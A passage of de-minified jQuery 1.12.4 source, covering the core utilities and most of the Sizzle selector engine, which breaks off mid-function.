/*! jQuery v1.12.4 | (c) jQuery Foundation | jquery.org/license */
!function(a, b) {
    "object" == typeof module && "object" == typeof module.exports ? module.exports = a.document ? b(a, !0) : function(a) {
        if (!a.document)
            throw new Error("jQuery requires a window with a document");
        return b(a)
    }
    : b(a)
}("undefined" != typeof window ? window : this, function(a, b) {
    var c = []
      , d = a.document
      , e = c.slice
      , f = c.concat
      , g = c.push
      , h = c.indexOf
      , i = {}
      , j = i.toString
      , k = i.hasOwnProperty
      , l = {}
      , m = "1.12.4"
      , n = function(a, b) {
        return new n.fn.init(a,b)
    }
      , o = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g
      , p = /^-ms-/
      , q = /-([\da-z])/gi
      , r = function(a, b) {
        return b.toUpperCase()
    };
    n.fn = n.prototype = {
        jquery: m,
        constructor: n,
        selector: "",
        length: 0,
        toArray: function() {
            return e.call(this)
        },
        get: function(a) {
            return null != a ? 0 > a ? this[a + this.length] : this[a] : e.call(this)
        },
        pushStack: function(a) {
            var b = n.merge(this.constructor(), a);
            return b.prevObject = this,
            b.context = this.context,
            b
        },
        each: function(a) {
            return n.each(this, a)
        },
        map: function(a) {
            return this.pushStack(n.map(this, function(b, c) {
                return a.call(b, c, b)
            }))
        },
        slice: function() {
            return this.pushStack(e.apply(this, arguments))
        },
        first: function() {
            return this.eq(0)
        },
        last: function() {
            return this.eq(-1)
        },
        eq: function(a) {
            var b = this.length
              , c = +a + (0 > a ? b : 0);
            return this.pushStack(c >= 0 && b > c ? [this[c]] : [])
        },
        end: function() {
            return this.prevObject || this.constructor()
        },
        push: g,
        sort: c.sort,
        splice: c.splice
    },
    n.extend = n.fn.extend = function() {
        var a, b, c, d, e, f, g = arguments[0] || {}, h = 1, i = arguments.length, j = !1;
        for ("boolean" == typeof g && (j = g,
        g = arguments[h] || {},
        h++),
        "object" == typeof g || n.isFunction(g) || (g = {}),
        h === i && (g = this,
        h--); i > h; h++)
            if (null != (e = arguments[h]))
                for (d in e)
                    a = g[d],
                    c = e[d],
                    g !== c && (j && c && (n.isPlainObject(c) || (b = n.isArray(c))) ? (b ? (b = !1,
                    f = a && n.isArray(a) ? a : []) : f = a && n.isPlainObject(a) ? a : {},
                    g[d] = n.extend(j, f, c)) : void 0 !== c && (g[d] = c));
        return g
    }
    ,
    n.extend({
        expando: "jQuery" + (m + Math.random()).replace(/\D/g, ""),
        isReady: !0,
        error: function(a) {
            throw new Error(a)
        },
        noop: function() {},
        isFunction: function(a) {
            return "function" === n.type(a)
        },
        isArray: Array.isArray || function(a) {
            return "array" === n.type(a)
        }
        ,
        isWindow: function(a) {
            return null != a && a == a.window
        },
        isNumeric: function(a) {
            var b = a && a.toString();
            return !n.isArray(a) && b - parseFloat(b) + 1 >= 0
        },
        isEmptyObject: function(a) {
            var b;
            for (b in a)
                return !1;
            return !0
        },
        isPlainObject: function(a) {
            var b;
            if (!a || "object" !== n.type(a) || a.nodeType || n.isWindow(a))
                return !1;
            try {
                if (a.constructor && !k.call(a, "constructor") && !k.call(a.constructor.prototype, "isPrototypeOf"))
                    return !1
            } catch (c) {
                return !1
            }
            if (!l.ownFirst)
                for (b in a)
                    return k.call(a, b);
            for (b in a)
                ;
            return void 0 === b || k.call(a, b)
        },
        type: function(a) {
            return null == a ? a + "" : "object" == typeof a || "function" == typeof a ? i[j.call(a)] || "object" : typeof a
        },
        globalEval: function(b) {
            b && n.trim(b) && (a.execScript || function(b) {
                a.eval.call(a, b)
            }
            )(b)
        },
        camelCase: function(a) {
            return a.replace(p, "ms-").replace(q, r)
        },
        nodeName: function(a, b) {
            return a.nodeName && a.nodeName.toLowerCase() === b.toLowerCase()
        },
        each: function(a, b) {
            var c, d = 0;
            if (s(a)) {
                for (c = a.length; c > d; d++)
                    if (b.call(a[d], d, a[d]) === !1)
                        break
            } else
                for (d in a)
                    if (b.call(a[d], d, a[d]) === !1)
                        break;
            return a
        },
        trim: function(a) {
            return null == a ? "" : (a + "").replace(o, "")
        },
        makeArray: function(a, b) {
            var c = b || [];
            return null != a && (s(Object(a)) ? n.merge(c, "string" == typeof a ? [a] : a) : g.call(c, a)),
            c
        },
        inArray: function(a, b, c) {
            var d;
            if (b) {
                if (h)
                    return h.call(b, a, c);
                for (d = b.length,
                c = c ? 0 > c ? Math.max(0, d + c) : c : 0; d > c; c++)
                    if (c in b && b[c] === a)
                        return c
            }
            return -1
        },
        merge: function(a, b) {
            var c = +b.length
              , d = 0
              , e = a.length;
            while (c > d)
                a[e++] = b[d++];
            if (c !== c)
                while (void 0 !== b[d])
                    a[e++] = b[d++];
            return a.length = e,
            a
        },
        grep: function(a, b, c) {
            for (var d, e = [], f = 0, g = a.length, h = !c; g > f; f++)
                d = !b(a[f], f),
                d !== h && e.push(a[f]);
            return e
        },
        map: function(a, b, c) {
            var d, e, g = 0, h = [];
            if (s(a))
                for (d = a.length; d > g; g++)
                    e = b(a[g], g, c),
                    null != e && h.push(e);
            else
                for (g in a)
                    e = b(a[g], g, c),
                    null != e && h.push(e);
            return f.apply([], h)
        },
        guid: 1,
        proxy: function(a, b) {
            var c, d, f;
            return "string" == typeof b && (f = a[b],
            b = a,
            a = f),
            n.isFunction(a) ? (c = e.call(arguments, 2),
            d = function() {
                return a.apply(b || this, c.concat(e.call(arguments)))
            }
            ,
            d.guid = a.guid = a.guid || n.guid++,
            d) : void 0
        },
        now: function() {
            return +new Date
        },
        support: l
    }),
    "function" == typeof Symbol && (n.fn[Symbol.iterator] = c[Symbol.iterator]),
    n.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function(a, b) {
        i["[object " + b + "]"] = b.toLowerCase()
    });
    function s(a) {
        var b = !!a && "length"in a && a.length
          , c = n.type(a);
        return "function" === c || n.isWindow(a) ? !1 : "array" === c || 0 === b || "number" == typeof b && b > 0 && b - 1 in a
    }
    var t = function(a) {
        var b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u = "sizzle" + 1 * new Date, v = a.document, w = 0, x = 0, y = ga(), z = ga(), A = ga(), B = function(a, b) {
            return a === b && (l = !0),
            0
        }, C = 1 << 31, D = {}.hasOwnProperty, E = [], F = E.pop, G = E.push, H = E.push, I = E.slice, J = function(a, b) {
            for (var c = 0, d = a.length; d > c; c++)
                if (a[c] === b)
                    return c;
            return -1
        }, K = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped", L = "[\\x20\\t\\r\\n\\f]", M = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+", N = "\\[" + L + "*(" + M + ")(?:" + L + "*([*^$|!~]?=)" + L + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + M + "))|)" + L + "*\\]", O = ":(" + M + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + N + ")*)|.*)\\)|)", P = new RegExp(L + "+","g"), Q = new RegExp("^" + L + "+|((?:^|[^\\\\])(?:\\\\.)*)" + L + "+$","g"), R = new RegExp("^" + L + "*," + L + "*"), S = new RegExp("^" + L + "*([>+~]|" + L + ")" + L + "*"), T = new RegExp("=" + L + "*([^\\]'\"]*?)" + L + "*\\]","g"), U = new RegExp(O), V = new RegExp("^" + M + "$"), W = {
            ID: new RegExp("^#(" + M + ")"),
            CLASS: new RegExp("^\\.(" + M + ")"),
            TAG: new RegExp("^(" + M + "|[*])"),
            ATTR: new RegExp("^" + N),
            PSEUDO: new RegExp("^" + O),
            CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + L + "*(even|odd|(([+-]|)(\\d*)n|)" + L + "*(?:([+-]|)" + L + "*(\\d+)|))" + L + "*\\)|)","i"),
            bool: new RegExp("^(?:" + K + ")$","i"),
            needsContext: new RegExp("^" + L + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + L + "*((?:-\\d)?\\d*)" + L + "*\\)|)(?=[^-]|$)","i")
        }, X = /^(?:input|select|textarea|button)$/i, Y = /^h\d$/i, Z = /^[^{]+\{\s*\[native \w/, $ = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/, _ = /[+~]/, aa = /'|\\/g, ba = new RegExp("\\\\([\\da-f]{1,6}" + L + "?|(" + L + ")|.)","ig"), ca = function(a, b, c) {
            var d = "0x" + b - 65536;
            return d !== d || c ? b : 0 > d ? String.fromCharCode(d + 65536) : String.fromCharCode(d >> 10 | 55296, 1023 & d | 56320)
        }, da = function() {
            m()
        };
        try {
            H.apply(E = I.call(v.childNodes), v.childNodes),
            E[v.childNodes.length].nodeType
        } catch (ea) {
            H = {
                apply: E.length ? function(a, b) {
                    G.apply(a, I.call(b))
                }
                : function(a, b) {
                    var c = a.length
                      , d = 0;
                    while (a[c++] = b[d++])
                        ;
                    a.length = c - 1
                }
            }
        }
        function fa(a, b, d, e) {
            var f, h, j, k, l, o, r, s, w = b && b.ownerDocument, x = b ? b.nodeType : 9;
            if (d = d || [],
            "string" != typeof a || !a || 1 !== x && 9 !== x && 11 !== x)
                return d;
            if (!e && ((b ? b.ownerDocument || b : v) !== n && m(b),
            b = b || n,
            p)) {
                if (11 !== x && (o = $.exec(a)))
                    if (f = o[1]) {
                        if (9 === x) {
                            if (!(j = b.getElementById(f)))
                                return d;
                            if (j.id === f)
                                return d.push(j),
                                d
                        } else if (w && (j = w.getElementById(f)) && t(b, j) && j.id === f)
                            return d.push(j),
                            d
                    } else {
                        if (o[2])
                            return H.apply(d, b.getElementsByTagName(a)),
                            d;
                        if ((f = o[3]) && c.getElementsByClassName && b.getElementsByClassName)
                            return H.apply(d, b.getElementsByClassName(f)),
                            d
                    }
                if (c.qsa && !A[a + " "] && (!q || !q.test(a))) {
                    if (1 !== x)
                        w = b,
                        s = a;
                    else if ("object" !== b.nodeName.toLowerCase()) {
                        (k = b.getAttribute("id")) ? k = k.replace(aa, "\\$&") : b.setAttribute("id", k = u),
                        r = g(a),
                        h = r.length,
                        l = V.test(k) ? "#" + k : "[id='" + k + "']";
                        while (h--)
                            r[h] = l + " " + qa(r[h]);
                        s = r.join(","),
                        w = _.test(a) && oa(b.parentNode) || b
                    }
                    if (s)
                        try {
                            return H.apply(d, w.querySelectorAll(s)),
                            d
                        } catch (y) {} finally {
                            k === u && b.removeAttribute("id")
                        }
                }
            }
            return i(a.replace(Q, "$1"), b, d, e)
        }
        function ga() {
            var a = [];
            function b(c, e) {
                return a.push(c + " ") > d.cacheLength && delete b[a.shift()],
                b[c + " "] = e
            }
            return b
        }
        function ha(a) {
            return a[u] = !0,
            a
        }
        function ia(a) {
            var b = n.createElement("div");
            try {
                return !!a(b)
            } catch (c) {
                return !1
            } finally {
                b.parentNode && b.parentNode.removeChild(b),
                b = null
            }
        }
        function ja(a, b) {
            var c = a.split("|")
              , e = c.length;
            while (e--)
                d.attrHandle[c[e]] = b
        }
        function ka(a, b) {
            var c = b && a
              , d = c && 1 === a.nodeType && 1 === b.nodeType && (~b.sourceIndex || C) - (~a.sourceIndex || C);
            if (d)
                return d;
            if (c)
                while (c = c.nextSibling)
                    if (c === b)
                        return -1;
            return a ? 1 : -1
        }
        function la(a) {
            return function(b) {
                var c = b.nodeName.toLowerCase();
                return "input" === c && b.type === a
            }
        }
        function ma(a) {
            return function(b) {
                var c = b.nodeName.toLowerCase();
                return ("input" === c || "button" === c) && b.type === a
            }
        }
        function na(a) {
            return ha(function(b) {
                return b = +b,
                ha(function(c, d) {
                    var e, f = a([], c.length, b), g = f.length;
                    while (g--)
                        c[e = f[g]] && (c[e] = !(d[e] = c[e]))
                })
            })
        }
        function oa(a) {
            return a && "undefined" != typeof a.getElementsByTagName && a
        }
        c = fa.support = {},
        f = fa.isXML = function(a) {
            var b = a && (a.ownerDocument || a).documentElement;
            return b ? "HTML" !== b.nodeName : !1
        }
        ,
        m = fa.setDocument = function(a) {
            var b, e, g = a ? a.ownerDocument || a : v;
            return g !== n && 9 === g.nodeType && g.documentElement ? (n = g,
            o = n.documentElement,
            p = !f(n),
            (e = n.defaultView) && e.top !== e && (e.addEventListener ? e.addEventListener("unload", da, !1) : e.attachEvent && e.attachEvent("onunload", da)),
            c.attributes = ia(function(a) {
                return a.className = "i",
                !a.getAttribute("className")
            }),
            c.getElementsByTagName = ia(function(a) {
                return a.appendChild(n.createComment("")),
                !a.getElementsByTagName("*").length
            }),
            c.getElementsByClassName = Z.test(n.getElementsByClassName),
            c.getById = ia(function(a) {
                return o.appendChild(a).id = u,
                !n.getElementsByName || !n.getElementsByName(u).length
            }),
            c.getById ? (d.find.ID = function(a, b) {
                if ("undefined" != typeof b.getElementById && p) {
                    var c = b.getElementById(a);
                    return c ? [c] : []
                }
            }
            ,
            d.filter.ID = function(a) {
                var b = a.replace(ba, ca);
                return function(a) {
                    return a.getAttribute("id") === b
                }
            }
            ) : (delete d.find.ID,
            d.filter.ID = function(a) {
                var b = a.replace(ba, ca);
                return function(a) {
                    var c = "undefined" != typeof a.getAttributeNode && a.getAttributeNode("id");
                    return c && c.value === b
                }
            }
            ),
            d.find.TAG = c.getElementsByTagName ? function(a, b) {
                return "undefined" != typeof b.getElementsByTagName ? b.getElementsByTagName(a) : c.qsa ? b.querySelectorAll(a) : void 0
            }
            : function(a, b) {
                var c, d = [], e = 0, f = b.getElementsByTagName(a);
                if ("*" === a) {
                    while (c = f[e++])
                        1 === c.nodeType && d.push(c);
                    return d
                }
                return f
            }
            ,
            d.find.CLASS = c.getElementsByClassName && function(a, b) {
                return "undefined" != typeof b.getElementsByClassName && p ? b.getElementsByClassName(a) : void 0
            }
            ,
            r = [],
            q = [],
            (c.qsa = Z.test(n.querySelectorAll)) && (ia(function(a) {
                o.appendChild(a).innerHTML = "<a id='" + u + "'></a><select id='" + u + "-\r\\' msallowcapture=''><option selected=''></option></select>",
                a.querySelectorAll("[msallowcapture^='']").length && q.push("[*^$]=" + L + "*(?:''|\"\")"),
                a.querySelectorAll("[selected]").length || q.push("\\[" + L + "*(?:value|" + K + ")"),
                a.querySelectorAll("[id~=" + u + "-]").length || q.push("~="),
                a.querySelectorAll(":checked").length || q.push(":checked"),
                a.querySelectorAll("a#" + u + "+*").length || q.push(".#.+[+~]")
            }),
            ia(function(a) {
                var b = n.createElement("input");
                b.setAttribute("type", "hidden"),
                a.appendChild(b).setAttribute("name", "D"),
                a.querySelectorAll("[name=d]").length && q.push("name" + L + "*[*^$|!~]?="),
                a.querySelectorAll(":enabled").length || q.push(":enabled", ":disabled"),
                a.querySelectorAll("*,:x"),
                q.push(",.*:")
            })),
            (c.matchesSelector = Z.test(s = o.matches || o.webkitMatchesSelector || o.mozMatchesSelector || o.oMatchesSelector || o.msMatchesSelector)) && ia(function(a) {
                c.disconnectedMatch = s.call(a, "div"),
                s.call(a, "[s!='']:x"),
                r.push("!=", O)
            }),
            q = q.length && new RegExp(q.join("|")),
            r = r.length && new RegExp(r.join("|")),
            b = Z.test(o.compareDocumentPosition),
            t = b || Z.test(o.contains) ? function(a, b) {
                var c = 9 === a.nodeType ? a.documentElement : a
                  , d = b && b.parentNode;
                return a === d || !(!d || 1 !== d.nodeType || !(c.contains ? c.contains(d) : a.compareDocumentPosition && 16 & a.compareDocumentPosition(d)))
            }
            : function(a, b) {
                if (b)
                    while (b = b.parentNode)
                        if (b === a)
                            return !0;
                return !1
            }
            ,
            B = b ? function(a, b) {
                if (a === b)
                    return l = !0,
                    0;
                var d = !a.compareDocumentPosition - !b.compareDocumentPosition;
                return d ? d : (d = (a.ownerDocument || a) === (b.ownerDocument || b) ? a.compareDocumentPosition(b) : 1,
                1 & d || !c.sortDetached && b.compareDocumentPosition(a) === d ? a === n || a.ownerDocument === v && t(v, a) ? -1 : b === n || b.ownerDocument === v && t(v, b) ? 1 : k ? J(k, a) - J(k, b) : 0 : 4 & d ? -1 : 1)
            }
            : function(a, b) {
                if (a === b)
                    return l = !0,
                    0;
                var c, d = 0, e = a.parentNode, f = b.parentNode, g = [a], h = [b];
                if (!e || !f)
                    return a === n ? -1 : b === n ? 1 : e ? -1 : f ? 1 : k ? J(k, a) - J(k, b) : 0;
                if (e === f)
                    return ka(a, b);
                c = a;
                while (c = c.parentNode)
                    g.unshift(c);
                c = b;
                while (c = c.parentNode)
                    h.unshift(c);
                while (g[d] === h[d])
                    d++;
                return d ? ka(g[d], h[d]) : g[d] === v ? -1 : h[d] === v ? 1 : 0
            }
            ,
            n) : n
        }
        ,
        fa.matches = function(a, b) {
            return fa(a, null, null, b)
        }
        ,
        fa.matchesSelector = function(a, b) {
            if ((a.ownerDocument || a) !== n && m(a),
            b = b.replace(T, "='$1']"),
            c.matchesSelector && p && !A[b + " "] && (!r || !r.test(b)) && (!q || !q.test(b)))
                try {
                    var d = s.call(a, b);
                    if (d || c.disconnectedMatch || a.document && 11 !== a.document.nodeType)
                        return d
                } catch (e) {}
            return fa(b, n, null, [a]).length > 0
        }
        ,
        fa.contains = function(a, b) {
            return (a.ownerDocument || a) !== n && m(a),
            t(a, b)
        }
        ,
        fa.attr = function(a, b) {
            (a.ownerDocument || a) !== n && m(a);
            var e = d.attrHandle[b.toLowerCase()]
              , f = e && D.call(d.attrHandle, b.toLowerCase()) ? e(a, b, !p) : void 0;
            return void 0 !== f ? f : c.attributes || !p ? a.getAttribute(b) : (f = a.getAttributeNode(b)) && f.specified ? f.value : null
        }
        ,
        fa.error = function(a) {
            throw new Error("Syntax error, unrecognized expression: " + a)
        }
        ,
        fa.uniqueSort = function(a) {
            var b, d = [], e = 0, f = 0;
            if (l = !c.detectDuplicates,
            k = !c.sortStable && a.slice(0),
            a.sort(B),
            l) {
                while (b = a[f++])
                    b === a[f] && (e = d.push(f));
                while (e--)
                    a.splice(d[e], 1)
            }
            return k = null,
            a
        }
        ,
        e = fa.getText = function(a) {
            var b, c = "", d = 0, f = a.nodeType;
            if (f) {
                if (1 === f || 9 === f || 11 === f) {
                    if ("string" == typeof a.textContent)
                        return a.textContent;
                    for (a = a.firstChild; a; a = a.nextSibling)
                        c += e(a)
                } else if (3 === f || 4 === f)
                    return a.nodeValue
            } else
                while (b = a[d++])
                    c += e(b);
            return c
        }
        ,
        d = fa.selectors = {
            cacheLength: 50,
            createPseudo: ha,
            match: W,
            attrHandle: {},
            find: {},
            relative: {
                ">": {
                    dir: "parentNode",
                    first: !0
                },
                " ": {
                    dir: "parentNode"
                },
                "+": {
                    dir: "previousSibling",
                    first: !0
                },
                "~": {
                    dir: "previousSibling"
                }
            },
            preFilter: {
                ATTR: function(a) {
                    return a[1] = a[1].replace(ba, ca),
                    a[3] = (a[3] || a[4] || a[5] || "").replace(ba, ca),
                    "~=" === a[2] && (a[3] = " " + a[3] + " "),
                    a.slice(0, 4)
                },
                CHILD: function(a) {
                    return a[1] = a[1].toLowerCase(),
                    "nth" === a[1].slice(0, 3) ? (a[3] || fa.error(a[0]),
                    a[4] = +(a[4] ? a[5] + (a[6] || 1) : 2 * ("even" === a[3] || "odd" === a[3])),
                    a[5] = +(a[7] + a[8] || "odd" === a[3])) : a[3] && fa.error(a[0]),
                    a
                },
                PSEUDO: function(a) {
                    var b, c = !a[6] && a[2];
                    return W.CHILD.test(a[0]) ? null : (a[3] ? a[2] = a[4] || a[5] || "" : c && U.test(c) && (b = g(c, !0)) && (b = c.indexOf(")", c.length - b) - c.length) && (a[0] = a[0].slice(0, b),
                    a[2] = c.slice(0, b)),
                    a.slice(0, 3))
                }
            },
            filter: {
                TAG: function(a) {
                    var b = a.replace(ba, ca).toLowerCase();
                    return "*" === a ? function() {
                        return !0
                    }
                    : function(a) {
                        return a.nodeName && a.nodeName.toLowerCase() === b
                    }
                },
                CLASS: function(a) {
                    var b = y[a + " "];
                    return b || (b = new RegExp("(^|" + L + ")" + a + "(" + L + "|$)")) && y(a, function(a) {
                        return b.test("string" == typeof a.className && a.className || "undefined" != typeof a.getAttribute && a.getAttribute("class") || "")
                    })
                },
                ATTR: function(a, b, c) {
                    return function(d) {
                        var e = fa.attr(d, a);
                        return null == e ? "!=" === b : b ? (e += "",
                        "=" === b ? e === c : "!=" === b ? e !== c : "^=" === b ? c && 0 === e.indexOf(c) : "*=" === b ? c && e.indexOf(c) > -1 : "$=" === b ? c && e.slice(-c.length) === c : "~=" === b ? (" " + e.replace(P, " ") + " ").indexOf(c) > -1 : "|=" === b ? e === c || e.slice(0, c.length + 1) === c + "-" : !1) : !0
                    }
                },
                CHILD: function(a, b, c, d, e) {
                    var f = "nth" !== a.slice(0, 3)
                      , g = "last" !== a.slice(-4)
                      , h = "of-type" === b;
                    return 1 === d && 0 === e ? function(a) {
                        return !!a.parentNode
                    }
                    : function(b, c, i) {
                        var j, k, l, m, n, o, p = f !== g ? "nextSibling" : "previousSibling", q = b.parentNode, r = h && b.nodeName.toLowerCase(), s = !i && !h, t = !1;
                        if (q) {
                            if (f) {
                                while (p) {
                                    m = b;
                                    while (m = m[p])
                                        if (h ? m.nodeName.toLowerCase() === r : 1 === m.nodeType)
                                            return !1;
                                    o = p = "only" === a && !o && "nextSibling"
                                }
                                return !0
                            }
                            if (o = [g ? q.firstChild : q.lastChild],
                            g && s) {
                                m = q,
                                l = m[u] || (m[u] = {}),
                                k = l[m.uniqueID] || (l[m.uniqueID] = {}),
                                j = k[a] || [],
                                n = j[0] === w && j[1],
                                t = n && j[2],
                                m = n && q.childNodes[n];
                                while (m = ++n && m && m[p] || (t = n = 0) || o.pop())
                                    if (1 === m.nodeType && ++t && m === b) {
                                        k[a] = [w, n, t];
                                        break
                                    }
                            } else if (s && (m = b,
                            l = m[u] || (m[u] = {}),
                            k = l[m.uniqueID] || (l[m.uniqueID] = {}),
                            j = k[a] || [],
                            n = j[0] === w && j[1],
                            t = n),
                            t === !1)
                                while (m = ++n && m && m[p] || (t = n = 0) || o.pop())
                                    if ((h ? m.nodeName.toLowerCase() === r : 1 === m.nodeType) && ++t && (s && (l = m[u] || (m[u] = {}),
                                    k = l[m.uniqueID] || (l[m.uniqueID] = {}),
                                    k[a] = [w, t]),
                                    m === b))
                                        break;
                            return t -= e,
                            t === d || t % d === 0 && t / d >= 0
                        }
                    }
                },
                PSEUDO: function(a, b) {
                    var c, e = d.pseudos[a] || d.setFilters[a.toLowerCase()] || fa.error("unsupported pseudo: " + a);
                    return e[u] ? e(b) : e.length > 1 ? (c = [a, a, "", b],
                    d.setFilters.hasOwnProperty(a.toLowerCase()) ? ha(function(a, c) {
                        var d, f = e(a, b), g = f.length;
                        while (g--)
                            d = J(a, f[g]),
                            a[d] = !(c[d] = f[g])
                    }) : function(a) {
                        return e(a, 0, c)
                    }
                    ) : e
                }
            },
            pseudos: {
                not: ha(function(a) {
                    var b = []
                      , c = []
                      , d = h(a.replace(Q, "$1"));
                    return d[u] ? ha(function(a, b, c, e) {
                        var f, g = d(a, null, e, []), h = a.length;
                        while (h--)
                            (f = g[h]) && (a[h] = !(b[h] = f))
                    }) : function(a, e, f) {
                        return b[0] = a,
                        d(b, null, f, c),
                        b[0] = null,
                        !c.pop()
                    }
                }),
                has: ha(function(a) {
                    return function(b) {
                        return fa(a, b).length > 0
                    }
                }),
                contains: ha(function(a) {
                    return a = a.replace(ba, ca),
                    function(b) {
                        return (b.textContent || b.innerText || e(b)).indexOf(a) > -1
                    }
                }),
                lang: ha(function(a) {
                    return V.test(a || "") || fa.error("unsupported lang: " + a),
                    a = a.replace(ba, ca).toLowerCase(),
                    function(b) {
                        var c;
                        do
                            if (c = p ? b.lang : b.getAttribute("xml:lang") || b.getAttribute("lang"))
                                return c = c.toLowerCase(),
                                c === a || 0 === c.indexOf(a + "-");
                        while ((b = b.parentNode) && 1 === b.nodeType);return !1
                    }
                }),
                target: function(b) {
                    var c = a.location && a.location.hash;
                    return c && c.slice(1) === b.id
                },
                root: function(a) {
                    return a === o
                },
                focus: function(a) {
                    return a === n.activeElement && (!n.hasFocus || n.hasFocus()) && !!(a.type || a.href || ~a.tabIndex)
                },
                enabled: function(a) {
                    return a.disabled === !1
                },
                disabled: function(a) {
                    return a.disabled === !0
                },
                checked: function(a) {
                    var b = a.nodeName.toLowerCase();
                    return "input" === b && !!a.checked || "option" === b && !!a.selected
                },
                selected: function(a) {
                    return a.parentNode && a.parentNode.selectedIndex,
                    a.selected === !0
                },
                empty: function(a) {
                    for (a = a.firstChild; a; a = a.nextSibling)
                        if (a.nodeType < 6)
                            return !1;
                    return !0
                },
                parent: function(a) {
                    return !d.pseudos.empty(a)
                },
                header: function(a) {
                    return Y.test(a.nodeName)
                },
                input: function(a) {
                    return X.test(a.nodeName)
                },
                button: function(a) {
                    var b = a.nodeName.toLowerCase();
                    return "input" === b && "button" === a.type || "button" === b
                },
                text: function(a) {
                    var b;
                    return "input" === a.nodeName.toLowerCase() && "text" === a.type && (null == (b = a.getAttribute("type")) || "text" === b.toLowerCase())
                },
                first: na(function() {
                    return [0]
                }),
                last: na(function(a, b) {
                    return [b - 1]
                }),
                eq: na(function(a, b, c) {
                    return [0 > c ? c + b : c]
                }),
                even: na(function(a, b) {
                    for (var c = 0; b > c; c += 2)
                        a.push(c);
                    return a
                }),
                odd: na(function(a, b) {
                    for (var c = 1; b > c; c += 2)
                        a.push(c);
                    return a
                }),
                lt: na(function(a, b, c) {
                    for (var d = 0 > c ? c + b : c; --d >= 0; )
                        a.push(d);
                    return a
                }),
                gt: na(function(a, b, c) {
                    for (var d = 0 > c ? c + b : c; ++d < b; )
                        a.push(d);
                    return a
                })
            }
        },
        d.pseudos.nth = d.pseudos.eq;
        for (b in {
            radio: !0,
            checkbox: !0,
            file: !0,
            password: !0,
            image: !0
        })
            d.pseudos[b] = la(b);
        for (b in {
            submit: !0,
            reset: !0
        })
            d.pseudos[b] = ma(b);
        function pa() {}
        pa.prototype = d.filters = d.pseudos,
        d.setFilters = new pa,
        g = fa.tokenize = function(a, b) {
            var c, e, f, g, h, i, j, k = z[a + " "];
            if (k)
                return b ? 0 : k.slice(0);
            h = a,
            i = [],
            j = d.preFilter;
            while (h) {
                c && !(e = R.exec(h)) || (e && (h = h.slice(e[0].length) || h),
                i.push(f = [])),
                c = !1,
                (e = S.exec(h)) && (c = e.shift(),
                f.push({
                    value: c,
                    type: e[0].replace(Q, " ")
                }),
                h = h.slice(c.length));
                for (g in d.filter)
                    !(e = W[g].exec(h)) || j[g] && !(e = j[g](e)) || (c = e.shift(),
                    f.push({
                        value: c,
                        type: g,
                        matches: e
                    }),
                    h = h.slice(c.length));
                if (!c)
                    break
            }
            return b ? h.length : h ? fa.error(a) : z(a, i).slice(0)
        }
        ;
        function qa(a) {
            for (var b = 0, c = a.length, d = ""; c > b; b++)
                d += a[b].value;
            return d
        }
        function ra(a, b, c) {
            var d = b.dir
              , e = c && "parentNode" === d
              , f = x++;
            return b.first ? function(b, c, f) {
                while (b = b[d])
                    if (1 === b.nodeType || e)
                        return a(b, c, f)
            }
            : function(b, c, g) {
                var h, i, j, k = [w, f];
                if (g) {
                    while (b = b[d])
                        if ((1 === b.nodeType || e) && a(b, c, g))
                            return !0
                } else
                    while (b = b[d])
                        if (1 === b.nodeType || e) {
                            if (j = b[u] || (b[u] = {}),
                            i = j[b.uniqueID] || (j[b.uniqueID] = {}),
                            (h = i[d]) && h[0] === w && h[1] === f)
                                return k[2] = h[2];
                            if (i[d] = k,
                            k[2] = a(b, c, g))
                                return !0
                        }
            }
        }
        function sa(a) {
            return a.length > 1 ? function(b, c, d) {
                var e = a.length;
                while (e--)
                    if (!a[e](b, c, d))
                        return !1;
                return !0
            }
            : a[0]
        }
        function ta(a, b, c) {
            for (var d = 0, e = b.length; e > d; d++)
                fa(a, b[d], c);
            return c
        }
        function ua(a, b, c, d, e) {
            for (var f, g = [], h = 0, i = a.length, j = null != b; i > h; h++)
                (f = a[h]) && (c && !c(f, d, e) || (g.push(f),
                j && b.push(h)));
            return g
        }
        function va(a, b, c, d, e, f) {
            return d && !d[u] && (d = va(d)),
            e && !e[u] && (e = va(e, f)),
            ha(function(f, g, h, i) {
                var j, k, l, m = [], n = [], o = g.length, p = f || ta(b || "*", h.nodeType ? [h] : h, []), q = !a || !f && b ? p : ua(p, m, a, h, i), r = c ? e || (f ? a : o || d) ? [] : g : q;
                if (c && c(q, r, h, i),
                d) {
                    j = ua(r, n),
                    d(j, [], h, i),
                    k = j.length;
                    while (k--)
                        (l = j[k]) && (r[n[k]] = !(q[n[k]] = l))
                }
                if (f) {
                    if (e || a) {
                        if (e) {
                            j = [],
                            k = r.length;
                            while (k--)
                                (l = r[k]) && j.push(q[k] = l);
                            e(null, r = [], j, i)
                        }
                        k = r.length;
                        while (k--)
                            (l = r[k]) && (j = e ? J(f, l) : m[k]) > -1 && (f[j] = !(g[j] = l))
                    }
                } else
                    r = ua(r === g ? r.splice(o, r.length) : r),
                    e ? e(null, g, r, i) : H.apply(g, r)
            })
        }
        function wa(a) {
            for (var b, c, e, f = a.length, g = d.relative[a[0].type], h = g || d.relative[" "], i = g ? 1 : 0, k = ra(function(a) {
                return a === b
            }, h, !0), l = ra(function(a) {
                return J(b, a) > -1
            }, h, !0), m = [function(a, c, d) {
                var e = !g && (d || c !== j) || ((b = c).nodeType ? k(a, c, d) : l(a, c, d));
                return b = null,
                e
            }
            ]; f > i; i++)
                if (c = d.relative[a[i].type])
                    m = [ra(sa(m), c)];
                else {
                    if (c = d.filter[a[i].type].apply(null, a[i].matches),
                    c[u]) {
                        for (e = ++i; f > e; e++)
                            if (d.relative[a[e].type])
                                break;
                        return va(i > 1 && sa(m), i > 1 && qa(a.slice(0, i - 1).concat({
                            value: " " === a[i - 2].type ? "*" : ""
